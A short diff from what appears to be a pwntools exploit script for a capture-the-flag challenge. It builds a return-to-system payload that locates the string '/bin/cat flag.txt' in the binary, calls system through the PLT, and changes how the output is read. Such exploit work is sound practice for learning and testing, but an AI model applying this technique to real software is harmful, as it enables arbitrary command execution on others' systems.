@@ -20,4 +20,5 @@ payload += p64(next(e.search(b"/bin/cat flag.txt")))
 payload += p64(e.plt["system"])
 
 p.sendafter(b"> ", payload)
-p.recvall()
+p.recvline()
+p.recvline()
